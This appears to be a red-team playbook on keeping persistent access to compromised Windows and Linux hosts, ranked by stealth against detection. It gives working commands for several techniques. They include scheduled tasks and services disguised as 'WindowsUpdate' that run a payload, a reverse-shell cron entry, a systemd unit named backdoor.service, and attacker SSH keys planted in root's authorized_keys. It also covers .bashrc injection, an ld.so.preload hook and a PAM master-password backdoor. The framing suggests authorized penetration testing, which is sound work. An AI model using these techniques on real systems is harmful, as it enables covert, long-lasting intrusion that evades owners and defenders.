# Persistence Mechanisms

tags: persistence, wmi, com-hijack, dll-hijack, bits, scheduled-task, service, registry, cron, systemd, ssh, pam, linux, windows

## Objective
Establish persistent access on compromised hosts that survives reboots and standard remediation. Covers both Windows and Linux techniques.

## Prerequisites
- Admin/root access on target host
- Payload or implant ready for deployment

## Methodology

### Windows Persistence (by stealth)

| Technique | OPSEC | Detection |
|-----------|-------|-----------|
| WMI Event Subscriptions | 0.2 | Sysmon 19-21, Event 5861 |
| COM Hijacking | 0.2 | Sysmon 12/13 HKCU CLSID |
| DLL Hijacking | 0.2 | Sysmon 7 unsigned DLL load |
| BITS Jobs | 0.3 | bitsadmin /list, Event 59-61 |
| Scheduled Tasks | 0.5 | Event 106/4698 |
| Services | 0.5 | Event 7045 |
| Registry Run Keys | 0.7 | Sysmon 12/13, Autoruns |

### WMI Event Subscription (OPSEC: 0.2)
```powershell
# Permanent WMI event subscription — fires on system startup
$filterArgs = @{
    Name = 'TimerTrigger'
    EventNamespace = 'root\cimv2'
    QueryLanguage = 'WQL'
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}
$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $filterArgs
```

### Scheduled Task (OPSEC: 0.5)
```bash
# Create scheduled task via schtasks
schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\payload.exe" \
  /sc onlogon /ru SYSTEM
```

### Service Creation (OPSEC: 0.5)
```bash
# Create a Windows service
sc create "WindowsUpdateSvc" binpath= "C:\Windows\Temp\payload.exe" start= auto
sc start WindowsUpdateSvc
```

### Linux Persistence

### Cron Job (OPSEC: 0.3)
```bash
# Add reverse shell cron
echo "* * * * * /tmp/shell" >> /var/spool/cron/root
# Or: crontab -e
```

### Systemd Service (OPSEC: 0.4)
```bash
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=System Update Service

[Service]
ExecStart=/tmp/payload
Restart=always

[Install]
WantedBy=multi-user.target
EOF
systemctl enable backdoor.service
systemctl start backdoor.service
```

### SSH Authorized Keys (OPSEC: 0.2)
```bash
# Add attacker SSH key
echo "ssh-ed25519 AAAA... attacker@host" >> /root/.ssh/authorized_keys
echo "ssh-ed25519 AAAA... attacker@host" >> /home/user/.ssh/authorized_keys
```

### .bashrc Injection (OPSEC: 0.3)
```bash
# Execute payload on user login
echo '/tmp/payload &' >> /home/user/.bashrc
```

### PAM Backdoor (OPSEC: 0.5)
Modify `pam_unix.so` to accept a master password alongside the real password.

### LD_PRELOAD (OPSEC: 0.4)
```bash
echo "/tmp/evil.so" > /etc/ld.so.preload
# evil.so hooks authentication functions
```

## Graph Reporting
- Track persistence type and location on host nodes
- **ADMIN_TO edges**: maintained access path
- Record remediation requirements for each persistence method
- Update objective status: persistence established

## OPSEC Notes
- **Stealthiest Windows**: WMI subscriptions, COM hijacking, DLL hijacking
- **Stealthiest Linux**: SSH keys, cron in user context
- **Most detectable**: Registry run keys, services, systemd units
- Always consider cleanup requirements for engagement end

## Sequencing
- **After**: Lateral Movement + Privilege Escalation (need admin/root)
- **Feeds →**: Long-term access, re-entry capability
- Establish before engagement reporting phase
